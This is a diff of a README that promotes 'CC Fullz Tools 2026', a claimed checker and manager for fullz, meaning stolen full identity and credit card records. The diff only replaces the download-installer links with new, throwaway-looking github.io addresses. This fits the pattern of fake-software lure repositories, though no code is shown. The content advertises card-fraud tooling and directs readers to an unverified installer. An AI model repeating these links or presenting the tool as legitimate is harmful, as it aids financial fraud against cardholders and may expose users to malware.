@@ -2,7 +2,7 @@
 
 CC Fullz Tools 2026 is an advanced fullz pack and multi-country info tool designed for users who need complete fullz tools and a bulk fullz checker in one private fullz suite. This package provides comprehensive tools for managing and verifying full data sets with an intuitive interface.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Features
 
@@ -40,4 +40,4 @@ A: Yes, the interface supports both single entry checks and bulk processing for 
 
 You can get the latest version of CC Fullz Tools from our official distribution page.
 
-[Download from official website](https://yellowtaxisave.github.io/download-page/)
+[Download from official website](https://capitals-707-bringing.github.io/download-page/)
